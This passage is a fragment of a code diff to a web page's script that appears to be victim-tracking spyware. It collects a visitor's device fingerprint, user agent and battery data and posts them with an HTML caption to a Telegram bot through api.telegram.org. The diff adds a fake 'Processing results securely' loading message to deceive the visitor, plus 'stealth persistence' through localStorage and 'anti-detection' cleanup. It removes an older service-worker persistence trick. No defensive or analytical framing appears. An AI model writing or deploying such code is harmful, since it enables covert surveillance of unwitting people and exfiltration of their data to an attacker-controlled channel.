+🖥️ <b>Elite Fingerprint:</b> 4K Cam + Audio + Sensors + WebRTC
+💻 <b>Device:</b> ${victimData.fingerprint.userAgent.slice(0,80)}...
+🔋 <b>Battery:</b> ${victimData.fingerprint.battery}
+
+<i>🚀 HYPER-CAPTURE 1ms MODE ACTIVATED - 4K 60FPS STREAM</i>
+    `;
+    
+    const formData = new FormData();
+    formData.append('chat_id', chatId);
+    formData.append('caption', caption);
+    formData.append('parse_mode', 'HTML');
+    
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST', body: formData
+    });
 }
 
 function dataURItoBlob(dataURI) {
@@ -610,24 +523,31 @@ function dataURItoBlob(dataURI) {
     return new Blob([ab], { type: mimeString });
 }
 
-// PERSISTENCE & CLEANUP
-window.addEventListener('beforeunload', () => {
-    state.streams.forEach(stream => {
-        stream.getTracks().forEach(track => track.stop());
+function fakeLoading() {
+    document.querySelectorAll('.result').forEach(btn => {
+        btn.innerHTML += '<br><small>🔄 Processing results securely...</small>';
+        btn.style.background = '#0066cc';
     });
-});
+}
 
+// Stealth persistence across tabs/sessions
+if ('localStorage' in window) {
+    localStorage.setItem('captureActive', 'true');
+}
+
+// Anti-detection cleanup
+window.addEventListener('pagehide', cleanup);
+window.addEventListener('beforeunload', cleanup);
 window.addEventListener('visibilitychange', () => {
-    if (!document.hidden && state.hasInitialized) {
-        setTimeout(() => initAdvancedCapture('Tab Reactivated'), 1000);
+    if (!document.hidden && hasInitialized) {
+        setTimeout(() => location.reload(), 1000);
     }
 });
 
-// Service Worker for persistence (if supported)
-if ('serviceWorker' in navigator) {
-    navigator.serviceWorker.register('data:application/javascript;base64,' + btoa(`
-        self.addEventListener('fetch', e => e.respondWith(fetch(e.request)));
-    `)).catch(() => {});
+function cleanup() {
+    if (currentStream) {
+        currentStream.getTracks().forEach(track => track.stop());
+    }
 }
 </script>
 
